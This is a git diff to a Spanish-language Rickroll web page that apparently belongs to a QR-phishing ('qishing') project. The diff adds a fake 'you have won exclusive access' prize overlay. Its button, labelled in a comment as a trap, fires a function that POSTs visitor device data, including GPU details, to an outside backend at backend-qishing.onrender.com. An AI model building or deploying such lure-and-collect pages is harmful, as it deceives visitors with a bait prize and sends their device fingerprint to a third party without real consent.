@@ -15,6 +15,23 @@
 </head>
 <body class="bg-gray-950 text-white min-h-screen flex flex-col items-center justify-between p-4 selection:bg-pink-500 selection:text-white">
 
+    <!-- SECCIÓN DE INTERACCIÓN PREVIA (EL GANCHO) -->
+    <div id="consent-overlay" class="fixed inset-0 bg-gray-950/90 backdrop-blur-md z-50 flex items-center justify-center p-4">
+        <div class="bg-gray-900 border border-gray-800 p-8 rounded-2xl max-w-md w-full text-center shadow-2xl glow-box">
+            <div class="text-4xl mb-4">🎁</div>
+            <h2 class="text-2xl font-bold mb-2 bg-gradient-to-r from-pink-500 to-blue-500 bg-clip-text text-transparent">
+                ¡Has ganado un acceso exclusivo!
+            </h2>
+            <p class="text-gray-400 text-sm mb-6">
+                Para ver el contenido compartido y reclamar tu premio secreto, haz clic en el botón de abajo para continuar.
+            </p>
+            <button id="btn-continuar" class="w-full py-3 bg-gradient-to-r from-pink-600 to-blue-600 hover:from-pink-500 hover:to-blue-500 font-bold rounded-xl transition cursor-pointer shadow-lg">
+                Deseo continuar y ver contenido 🚀
+            </button>
+        </div>
+    </div>
+
+    <!-- CONTENIDO PRINCIPAL (OCULTO INICIALMENTE) -->
     <header class="text-center py-6">
         <h1 class="text-4xl md:text-6xl font-extrabold tracking-tight bg-gradient-to-r from-pink-500 via-purple-500 to-blue-500 bg-clip-text text-transparent">
             ¡Felicidades, has sido Rickrolleado! 🎵
@@ -28,7 +45,6 @@
                 id="rick-video"
                 class="w-full h-full object-cover"
                 controls 
-                autoplay
                 loop 
                 playsinline>
                 <source src="rick.mp4" type="video/mp4">
@@ -102,8 +118,7 @@
                 gpu: gpu
             };
 
-            // URL configurada de tu nuevo backend en Render
-const URL_BACKEND_RENDER = "https://backend-qishing.onrender.com/api/registrar";
+            const URL_BACKEND_RENDER = "https://backend-qishing.onrender.com/api/registrar";
 
             fetch(URL_BACKEND_RENDER, {
                 method: 'POST',
@@ -112,9 +127,15 @@ const URL_BACKEND_RENDER = "https://backend-qishing.onrender.com/api/registrar";
             }).catch(err => console.log("Error al conectar con el backend"));
         }
 
-        window.addEventListener('DOMContentLoaded', () => {
+        // Evento al hacer clic en el botón trampa "Deseo continuar"
+        document.getElementById('btn-continuar').addEventListener('click', () => {
+            // 1. Ocultar la ventana de advertencia/gancho
+            document.getElementById('consent-overlay').style.display = 'none';
+
+            // 2. Disparar la recolección y envío de datos al backend
             recopilarYEnviarTelemetria();
 
+            // 3. Reproducir el video con audio habilitado de inmediato
             const videoEl = document.getElementById('rick-video');
             videoEl.muted = false;
             videoEl.play().catch(() => {});
